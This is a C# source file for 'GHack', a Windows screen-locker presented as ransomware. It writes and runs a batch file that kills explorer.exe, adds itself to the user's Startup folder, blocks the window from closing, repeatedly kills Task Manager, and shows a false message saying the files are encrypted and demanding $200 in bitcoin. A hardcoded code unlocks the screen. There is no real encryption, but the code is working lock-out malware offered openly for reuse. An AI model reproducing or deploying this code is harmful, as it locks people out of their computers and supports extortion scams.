using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;


// GHACK
// By iByNiki_
// Always give credits ;)

namespace GHack
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            createShortcut();
            string path = @"C:\explorerkiller.bat";
            using (FileStream fs = new FileStream(path, FileMode.OpenOrCreate))
            {
                using (TextWriter tw = new StreamWriter(fs))
                {
                    tw.WriteLine("taskkill /f /IM explorer.exe");
                }
            }
            using (FileStream fs = new FileStream(@"C:\startexplorer.bat", FileMode.OpenOrCreate))
            {
                using (TextWriter tw = new StreamWriter(fs))
                {
                    tw.WriteLine("start explorer.exe");
                }
            }
            Process.Start(@"C:\explorerkiller.bat");
            timer1.Start();
            timer2.Start();
            Warning.Text = "Your PC has been infected by the GHack ransomware and all your files have been encrypted!\n \nTo recive the decryption code pay 200$ worth on bitcoin to the following adress: \n \n1BoosSLRHtKNngkdXEzibR81b53LETtpyT (Fake address)";
        }

        private void createShortcut()
        {
            string deskDir = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";

            using (StreamWriter writer = new StreamWriter(deskDir + "\\" + "GHack" + ".url"))
            {
                string app = System.Reflection.Assembly.GetExecutingAssembly().Location;
                writer.WriteLine("[InternetShortcut]");
                writer.WriteLine("URL=file:///" + app);
                writer.WriteLine("IconIndex=0");
                string icon = app.Replace('\\', '/');
                writer.WriteLine("IconFile=" + icon);
                writer.Flush();
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {

        }

        private void Form1_Leave(object sender, EventArgs e)
        {
            
        }

        private void FixButton_Click(object sender, EventArgs e)
        {
            exitprogram();
        }
        private void exitprogram()
        {
            foreach (Process p in Process.GetProcessesByName("GHack"))
            {
                p.Kill();
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            foreach (Process p in Process.GetProcessesByName("taskmgr"))
            {
                p.Kill();
            }
        }

        private void Exit_Click(object sender, EventArgs e)
        {
            MessageBox.Show("There is no scape!", "There is no scape!");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (Code.Text == "1234567890")
            {
                int isCritical = 0;  // we want this to be a Critical Process
                int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

                Process.EnterDebugMode();  //acquire Debug Privileges

                // setting the BreakOnTermination = 1 for the current process
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                Process.Start(@"C:\startexplorer.bat");
                exitprogram();
            } else
            {
                MessageBox.Show("Wrong code!", "NOPE");
            }
        }
    }
}
